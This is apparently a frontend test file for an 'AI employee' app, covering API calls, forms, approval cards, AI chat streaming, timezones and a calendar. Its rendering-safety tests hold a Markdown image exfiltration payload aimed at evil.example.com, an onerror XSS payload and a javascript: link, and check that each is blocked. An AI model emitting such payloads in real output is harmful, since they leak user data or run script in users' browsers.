import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import type { ReactNode } from "react";
import { MemoryRouter, Route, Routes } from "react-router-dom";
import { afterEach, describe, expect, it, vi } from "vitest";
import { ApprovalCard } from "@/components/ApprovalCard";
import { Markdown } from "@/components/common";
import { CalendarPage } from "@/pages/Calendar";
import { AuthProvider } from "@/contexts";
import { AIEmployeePage } from "@/pages/AIEmployee";
import { LoginPage, validateRegistration } from "@/pages/Auth";
import { TaskDialog, validateTaskForm } from "@/pages/Tasks";
import { ApiError, api, streamChat } from "@/services/api";
import type { Approval } from "@/types";
import { setDisplayTimezone, zonedDate, zonedInputToIso } from "@/utils";

function json(body: unknown, status = 200) {
  return new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json" } });
}

type Route = (url: string, init: RequestInit) => Response | undefined;
function mockFetch(route: Route) {
  return vi.spyOn(globalThis, "fetch").mockImplementation(async (input, init) => {
    const url = String(input);
    return route(url, init ?? {}) ?? (url.includes("/auth/me") ? json({ error: { code: "unauthorized", message: "x" } }, 401) : json({ items: [], total: 0, page: 1, page_size: 20 }));
  });
}

function wrap(ui: ReactNode, path = "/") {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(<QueryClientProvider client={client}><MemoryRouter initialEntries={[path]}><AuthProvider>{ui}</AuthProvider></MemoryRouter></QueryClientProvider>);
}

const baseApproval: Approval = {
  id: "a1", action_type: "send_email", title: "Reply to Ann", description: "", payload: { to: ["ann@example.com"], cc: [], subject: "Re: Hi", body: "Hello", email_id: null },
  payload_hash: "h".repeat(64), version: 1, status: "pending", requested_by: "email", origin: "chat", conversation_id: null, derived_from_untrusted: false, simulated: true,
  result: null, error: null, expires_at: "2030-01-01T00:00:00Z", decided_at: null, executed_at: null, created_at: "2026-01-01T00:00:00Z",
};

describe("API client", () => {
  it("sends the CSRF token on writes and parses the error envelope", async () => {
    document.cookie = "ap_csrf=tok123";
    const fetchMock = mockFetch(() => json({ error: { code: "conflict", message: "Nope", details: null } }, 409));
    const error: any = await api.post("/x", { a: 1 }).catch((e) => e);
    expect(error).toBeInstanceOf(ApiError);
    expect(error.code).toBe("conflict");
    expect((fetchMock.mock.calls[0][1]!.headers as Record<string, string>)["X-CSRF-Token"]).toBe("tok123");
  });

  it("reports network failures clearly", async () => {
    vi.spyOn(globalThis, "fetch").mockRejectedValue(new TypeError("failed"));
    await expect(api.get("/x")).rejects.toMatchObject({ code: "network_error" });
  });

  it("broadcasts expired sessions", async () => {
    mockFetch(() => json({ error: { code: "unauthorized", message: "Sign in" } }, 401));
    const listener = vi.fn();
    window.addEventListener("autopilot:unauthorized", listener);
    await api.get("/tasks").catch(() => undefined);
    window.removeEventListener("autopilot:unauthorized", listener);
    expect(listener).toHaveBeenCalledOnce();
  });

  it("parses server-sent events across chunk boundaries", async () => {
    const encoder = new TextEncoder();
    const body = new ReadableStream({
      start(controller) {
        controller.enqueue(encoder.encode('event: plan\ndata: {"type":"pl'));
        controller.enqueue(encoder.encode('an"}\n\n: keep-alive\n\nevent: token\ndata: {"type":"token","text":"Hi"}\n\n'));
        controller.close();
      },
    });
    vi.spyOn(globalThis, "fetch").mockResolvedValue(new Response(body, { status: 200 }));
    const events: any[] = [];
    await streamChat("/ai/chat", {}, (e) => events.push(e));
    expect(events.map((e) => e.type)).toEqual(["plan", "token"]);
  });
});

describe("form validation", () => {
  it("validates registration", () => {
    expect(validateRegistration({ name: "", email: "bad", password: "short" })).toEqual({ name: expect.any(String), email: expect.any(String), password: expect.any(String) });
    expect(validateRegistration({ name: "A", email: "a@b.co", password: "lettersonlyhere" }).password).toMatch(/letters and numbers/);
    expect(validateRegistration({ name: "A", email: "a@b.co", password: "Valid12345678" })).toEqual({});
  });

  it("validates tasks", () => {
    const base = { title: "x", description: "", priority: "medium" as const, status: "pending" as const, category: "", progress: 0, due: "" };
    expect(validateTaskForm(base)).toEqual({});
    expect(validateTaskForm({ ...base, title: "  " }).title).toBeDefined();
    expect(validateTaskForm({ ...base, progress: 101 }).progress).toBeDefined();
  });

  it("task dialog blocks empty titles and sends valid ones", async () => {
    const user = userEvent.setup();
    const fetchMock = mockFetch((url, init) => (url.includes("/auth/me") ? json({ error: { code: "x", message: "x" } }, 401) : init.method === "POST" ? json({ id: "1" }, 201) : undefined));
    wrap(<TaskDialog task={null} open onOpenChange={() => undefined} />);
    await user.click(await screen.findByRole("button", { name: "Create task" }));
    expect(await screen.findByRole("alert")).toHaveTextContent("title");
    expect(fetchMock.mock.calls.filter(([, i]) => i?.method === "POST")).toHaveLength(0);
    await user.type(screen.getByLabelText("Title"), "Write tests");
    await user.click(screen.getByRole("button", { name: "Create task" }));
    await waitFor(() => expect(fetchMock.mock.calls.some(([u, i]) => String(u) === "/api/tasks" && i?.method === "POST" && String(i.body).includes("Write tests"))).toBe(true));
  });
});

describe("login", () => {
  it("shows the server's error", async () => {
    const user = userEvent.setup();
    mockFetch((url) => (url.includes("/auth/me") ? json({ error: { code: "unauthorized", message: "x" } }, 401) : url.includes("/auth/login") ? json({ error: { code: "invalid_credentials", message: "Incorrect email or password." } }, 401) : undefined));
    wrap(<LoginPage />);
    await user.type(screen.getByLabelText("Email"), "a@example.com");
    await user.type(screen.getByLabelText("Password"), "wrongpass");
    await user.click(screen.getByRole("button", { name: "Sign in" }));
    expect(await screen.findByRole("alert")).toHaveTextContent("Incorrect email or password.");
  });
});

describe("ApprovalCard", () => {
  it("shows the action, and labels simulation", () => {
    mockFetch(() => undefined);
    wrap(<ApprovalCard approval={baseApproval} />);
    expect(screen.getByText("Send email")).toBeInTheDocument();
    expect(screen.getByText("Waiting for approval")).toBeInTheDocument();
    expect(screen.getByText("Simulated")).toBeInTheDocument();
    expect(screen.getByText("ann@example.com")).toBeInTheDocument();
  });

  it("approves with the exact payload hash it displayed", async () => {
    const user = userEvent.setup();
    const fetchMock = mockFetch((url) => (url.endsWith("/approve") ? json({ ...baseApproval, status: "executed" }) : undefined));
    wrap(<ApprovalCard approval={baseApproval} />);
    await user.click(screen.getByRole("button", { name: "Approve" }));
    await waitFor(() => {
      const call = fetchMock.mock.calls.find(([u]) => String(u).endsWith("/approve"));
      expect(JSON.parse(String(call![1]!.body))).toEqual({ payload_hash: baseApproval.payload_hash });
    });
  });

  it("edits through the server, not by approving", async () => {
    const user = userEvent.setup();
    const fetchMock = mockFetch((_url, init) => (init.method === "PUT" ? json({ ...baseApproval, version: 2 }) : undefined));
    wrap(<ApprovalCard approval={baseApproval} />);
    await user.click(screen.getByRole("button", { name: "Edit" }));
    const body = screen.getByLabelText("Message");
    await user.clear(body);
    await user.type(body, "Changed");
    await user.click(screen.getByRole("button", { name: "Save changes" }));
    await waitFor(() => {
      const call = fetchMock.mock.calls.find(([, i]) => i?.method === "PUT");
      const sent = JSON.parse(String(call![1]!.body));
      expect(sent.expected_hash).toBe(baseApproval.payload_hash);
      expect(sent.payload.body).toBe("Changed");
    });
    expect(fetchMock.mock.calls.some(([u]) => String(u).endsWith("/approve"))).toBe(false);
  });

  it("never shows success for a failed action", () => {
    mockFetch(() => undefined);
    wrap(<ApprovalCard approval={{ ...baseApproval, status: "failed", error: "Gmail rejected the message" }} />);
    const card = within(screen.getByTestId("approval-card"));
    expect(card.getByRole("alert")).toHaveTextContent("Gmail rejected");
    expect(card.queryByRole("button", { name: "Approve" })).toBeNull();
    expect(card.queryByText(/Confirmed by the service/)).toBeNull();
  });

  it("warns when derived from untrusted content", () => {
    mockFetch(() => undefined);
    wrap(<ApprovalCard approval={{ ...baseApproval, derived_from_untrusted: true }} />);
    expect(screen.getByText(/Check the details before approving/)).toBeInTheDocument();
  });
});

describe("AI employee workflow", () => {
  it("streams a run and renders plan and confirmed result", async () => {
    const user = userEvent.setup();
    const message = { id: "m2", conversation_id: "c1", role: "assistant", content: "You have **2** overdue tasks.", status: "complete", created_at: "2026-01-01T00:00:00Z", meta: { simulated_ai: true, ledger: [], steps: [], plan: { objective: "Find overdue", intent: "execute", steps: [] } } };
    (message.meta as any).approval_ids = ["a1"];
    (message.meta as any).ledger = [{ kind: "done", title: "Saved report draft: R", agent: "document", entity: "document", entity_id: "d1" }];
    message.content = "All clear on overdue tasks.";
    let released = false;
    vi.spyOn(globalThis, "fetch").mockImplementation(async (input, init) => {
      const url = String(input);
      if (url.endsWith("/ai/chat") && init?.method === "POST") {
        const encoder = new TextEncoder();
        const events = [{ type: "accepted", conversation_id: "c1" }, { type: "plan", plan: { objective: "Find overdue", intent: "execute", steps: [{ id: "s1", agent: "task", goal: "List", depends_on: [] }] } }, { type: "token", text: "Working" }];
        released = true;
        return new Response(new ReadableStream({ start(c) { events.forEach((e) => c.enqueue(encoder.encode(`event: ${e.type}\ndata: ${JSON.stringify(e)}\n\n`))); c.close(); } }));
      }
      if (url.includes("/ai/conversations/c1")) return json({ id: "c1", title: "t", created_at: "", updated_at: "", messages: [{ id: "m1", conversation_id: "c1", role: "user", content: "Find my overdue tasks", status: "complete", created_at: "2026-01-01T00:00:00Z", meta: {} }, message] });
      if (url.endsWith("/ai/conversations")) return json(released ? [{ id: "c1", title: "Find my overdue tasks", created_at: "", updated_at: "" }] : []);
      if (url.includes("/auth/me")) return json({ error: { code: "x", message: "x" } }, 401);
      if (url.includes("/approvals")) return json({ items: [baseApproval], total: 1, page: 1, page_size: 100 });
      if (url.includes("/documents/d1")) return json({ id: "d1", title: "Atlas report", content: "## Verified facts\n\nMilestone reached [S1]" });
      return json({ items: [], total: 0, page: 1, page_size: 20 });
    });
    wrap(<Routes><Route path="/ai" element={<AIEmployeePage />} /><Route path="/ai/:id" element={<AIEmployeePage />} /></Routes>, "/ai");
    await user.type(screen.getByLabelText("Message your AI employee"), "Find my overdue tasks{Enter}");
    expect(await screen.findByText("All clear on overdue tasks.")).toBeInTheDocument();
    expect(screen.getByText("Saved report draft: R")).toBeInTheDocument();
    expect(await screen.findByTestId("approval-card")).toHaveTextContent("Waiting for approval");
    expect(await screen.findByTestId("document-preview")).toHaveTextContent("Atlas report");
    expect(screen.getByText("Demo AI")).toBeInTheDocument();
  });

  it("offers retry only on a retryable failure", async () => {
    vi.spyOn(globalThis, "fetch").mockImplementation(async (input) => {
      const url = String(input);
      if (url.endsWith("/ai/conversations")) return json([]);
      if (url.includes("/ai/conversations/c9")) return json({ id: "c9", title: "t", created_at: "", updated_at: "", messages: [{ id: "u", conversation_id: "c9", role: "user", content: "hi", status: "complete", created_at: "2026-01-01T00:00:00Z", meta: {} }, { id: "e", conversation_id: "c9", role: "assistant", content: "Provider down.", status: "error", created_at: "2026-01-01T00:00:01Z", meta: { error: { message: "Provider down.", retryable: true } } }] });
      if (url.includes("/auth/me")) return json({ error: { code: "x", message: "x" } }, 401);
      return json({ items: [], total: 0, page: 1, page_size: 20 });
    });
    wrap(<Routes><Route path="/ai/:id" element={<AIEmployeePage />} /></Routes>, "/ai/c9");
    expect(await screen.findByRole("alert")).toHaveTextContent("Provider down.");
    expect(screen.getByRole("button", { name: "Retry" })).toBeInTheDocument();
  });
});

describe("timezones", () => {
  afterEach(() => setDisplayTimezone(undefined));

  it("shows times in the saved timezone regardless of the browser", () => {
    setDisplayTimezone("Asia/Dhaka");
    expect(zonedDate("2026-11-09T09:00:00Z").getHours()).toBe(15);
    setDisplayTimezone("America/New_York");
    expect(zonedDate("2026-11-09T14:00:00Z").getHours()).toBe(9);
  });

  it("converts form values back to the correct instant, including across daylight saving", () => {
    setDisplayTimezone("Asia/Dhaka");
    expect(zonedInputToIso("2026-11-09T15:00")).toBe("2026-11-09T09:00:00.000Z");
    setDisplayTimezone("America/New_York");
    expect(zonedInputToIso("2026-07-01T09:00")).toBe("2026-07-01T13:00:00.000Z");
    expect(zonedInputToIso("2026-12-01T09:00")).toBe("2026-12-01T14:00:00.000Z");
  });
});

describe("safety of rendered AI text", () => {
  it("does not load remote images, which could leak data", () => {
    const { container } = render(<Markdown>{"Hello ![secret](https://evil.example.com/x.png?d=abc)"}</Markdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(container).toHaveTextContent("image removed");
  });

  it("does not render raw HTML or script links", () => {
    const { container } = render(<Markdown>{"<img src=x onerror=alert(1)> [go](javascript:alert(1))"}</Markdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector('a[href^="javascript"]')).toBeNull();
  });
});

describe("calendar", () => {
  it("proposes an update instead of changing a confirmed event", async () => {
    const user = userEvent.setup();
    const start = new Date(); start.setHours(10, 0, 0, 0);
    const end = new Date(start.getTime() + 3_600_000);
    const event = { id: "e1", title: "Standup", description: "", location: null, start_at: start.toISOString(), end_at: end.toISOString(), timezone: "UTC", attendees: [], status: "confirmed", source: "demo", is_demo: true };
    const fetchMock = mockFetch((url, init) => {
      if (url.includes("/calendar/events?")) return json([event]);
      if (url.includes("/update-proposal") && init.method === "POST") return json({ ...baseApproval, action_type: "update_calendar_event", payload: { title: "Renamed", start_at: "2030-01-01T10:00:00+00:00", end_at: "2030-01-01T11:00:00+00:00", timezone: "UTC", attendees: [] } }, 201);
      return undefined;
    });
    wrap(<CalendarPage />);
    await user.click((await screen.findAllByRole("button", { name: /Standup/ }))[0]);
    await user.click(await screen.findByRole("button", { name: "Edit" }));
    const title = screen.getByLabelText("Title");
    await user.clear(title);
    await user.type(title, "Renamed");
    await user.click(screen.getByRole("button", { name: "Propose update" }));
    expect(await screen.findByTestId("approval-card")).toHaveTextContent("Update calendar event");
    expect(fetchMock.mock.calls.some(([u, i]) => String(u).includes("/calendar/events/e1") && i?.method === "PUT")).toBe(false);
  });
});
